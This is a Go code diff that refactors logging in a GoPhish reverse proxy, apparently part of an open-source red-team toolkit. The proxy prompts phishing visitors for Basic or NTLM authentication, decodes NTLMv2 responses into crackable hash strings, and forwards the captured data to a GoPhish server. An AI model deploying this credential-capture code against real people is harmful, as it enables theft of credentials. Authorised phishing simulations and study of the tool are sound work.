@@ -14,6 +14,7 @@ import (
 	"github.com/hophouse/gop/auth/ntlm"
 	ntlmAuth "github.com/hophouse/gop/auth/ntlm"
 	"github.com/hophouse/gop/utils"
+	"github.com/hophouse/gop/utils/logger"
 	"github.com/urfave/negroni"
 )
 
@@ -21,9 +22,9 @@ func RunGoPhishProxyHTTPCmd(host string, port string, dstUrl string, gophishUrl 
 	begin := time.Now()
 
 	addr := fmt.Sprintf("%s:%s", host, port)
-	fmt.Printf("[+] Starting reverse proxy listening to : http://%s\n", addr)
-	fmt.Printf("[+] Redirect visitors to : %s\n", dstUrl)
-	fmt.Printf("[+] Log information in GoPhish at : %s\n", gophishUrl)
+	logger.Printf("[+] Starting reverse proxy listening to : http://%s\n", addr)
+	logger.Printf("[+] Redirect visitors to : %s\n", dstUrl)
+	logger.Printf("[+] Log information in GoPhish at : %s\n", gophishUrl)
 
 	gophishUrlParsed, err := url.Parse(gophishUrl)
 	if err != nil {
@@ -55,7 +56,7 @@ func RunGoPhishProxyHTTPCmd(host string, port string, dstUrl string, gophishUrl 
 	// Apply an auth system if requested
 	switch strings.ToLower(auth) {
 	case "basic":
-		fmt.Printf("[+] Add HTTP Basic auth header\n")
+		logger.Printf("[+] Add HTTP Basic auth header\n")
 		r.Handle("/{URL:.*}", negroni.New(
 			&logMiddleware{},
 			&basicAuth.BasicAuthMiddleware{
@@ -64,7 +65,7 @@ func RunGoPhishProxyHTTPCmd(host string, port string, dstUrl string, gophishUrl 
 			negroni.WrapFunc(proxy.HandleFunc),
 		))
 	case "ntlm":
-		fmt.Printf("[+] Add HTTP NTLM auth header\n")
+		logger.Printf("[+] Add HTTP NTLM auth header\n")
 		ntlmAuth.NtlmCapturedAuth = make(map[string]bool)
 		r.Handle("/{URL:.*}", negroni.New(
 			&logMiddleware{},
@@ -73,16 +74,16 @@ func RunGoPhishProxyHTTPCmd(host string, port string, dstUrl string, gophishUrl 
 		))
 
 	default:
-		fmt.Println("[!] No valid auth system was given")
+		logger.Println("[!] No valid auth system was given")
 		return
 	}
 
 	n := negroni.New(negroni.NewRecovery())
 	n.UseHandler(r)
-	utils.Log.Fatal(http.ListenAndServe(addr, n))
+	logger.Fatal(http.ListenAndServe(addr, n))
 
 	end := time.Now()
-	fmt.Printf("\n -  Execution time: %s\n", end.Sub(begin))
+	logger.Printf("\n -  Execution time: %s\n", end.Sub(begin))
 }
 
 type GoPhishReverseProxy struct {
@@ -92,7 +93,7 @@ type GoPhishReverseProxy struct {
 }
 
 func (rp *GoPhishReverseProxy) HandleTrackFunc(w http.ResponseWriter, r *http.Request) {
-	fmt.Printf("[+] [%s] Receive Tracking request %s - %s\n", utils.GetSourceIP(r), r.Method, r.URL.String())
+	logger.Printf("[+] [%s] Receive Tracking request %s - %s\n", utils.GetSourceIP(r), r.Method, r.URL.String())
 
 	// First send the request to GoPhish
 	newURL := r.URL
@@ -120,15 +121,14 @@ func (rp *GoPhishReverseProxy) HandleTrackFunc(w http.ResponseWriter, r *http.Re
 
 	_, err := client.Do(req)
 	if err != nil {
-		fmt.Println(err)
-		utils.Log.Println(err)
+		logger.Println(err)
 	}
 
-	fmt.Printf("[+] [%s] Sending tracker\n", utils.GetSourceIP(r))
+	logger.Printf("[+] [%s] Sending tracker\n", utils.GetSourceIP(r))
 }
 
 func (rp *GoPhishReverseProxy) HandleFunc(w http.ResponseWriter, r *http.Request) {
-	fmt.Printf("[+] [%s] Receive Credential request %s - %s\n", utils.GetSourceIP(r), r.Method, r.URL.String())
+	logger.Printf("[+] [%s] Receive Credential request %s - %s\n", utils.GetSourceIP(r), r.Method, r.URL.String())
 	r.Header.Del("Referer")
 
 	// First send the request to GoPhish
@@ -153,7 +153,7 @@ func (rp *GoPhishReverseProxy) HandleFunc(w http.ResponseWriter, r *http.Request
 			// Remove the "NTLM "
 			authorization_bytes, err := base64.StdEncoding.DecodeString(autorization[5:])
 			if err != nil {
-				utils.Log.Printf("Decode error authorization header : %s\n", authorization_bytes)
+				logger.Printf("Decode error authorization header : %s\n", authorization_bytes)
 				return
 			}
 
@@ -162,7 +162,7 @@ func (rp *GoPhishReverseProxy) HandleFunc(w http.ResponseWriter, r *http.Request
 
 			ntlmv2Response := ntlm.NTLMv2Response{}
 			ntlmv2Response.Read(msg3.NTLMv2Response.RawData)
-			utils.Log.Printf("%s", ntlmv2Response.ToString())
+			logger.Printf("%s", ntlmv2Response.ToString())
 
 			ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.RawData), string(msg3.TargetName.RawData), []byte(ntlm.Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.RawData[len(ntlmv2Response.NTProofStr):])
 
@@ -192,8 +192,7 @@ func (rp *GoPhishReverseProxy) HandleFunc(w http.ResponseWriter, r *http.Request
 
 		_, err := client.Do(req)
 		if err != nil {
-			fmt.Println(err)
-			utils.Log.Println(err)
+			logger.Println(err)
 		}
 
 	} else {
@@ -206,10 +205,9 @@ func (rp *GoPhishReverseProxy) HandleFunc(w http.ResponseWriter, r *http.Request
 
 		_, err := client.Do(newRequest)
 		if err != nil {
-			fmt.Println(err)
-			utils.Log.Println(err)
+			logger.Println(err)
 		}
-		fmt.Printf("[+] [%s] Send request %s to %s\n", utils.GetSourceIP(r), newRequest.Method, newRequest.URL.String())
+		logger.Printf("[+] [%s] Send request %s to %s\n", utils.GetSourceIP(r), newRequest.Method, newRequest.URL.String())
 	}
 
 	// Secondly redirect the user to the defined destination
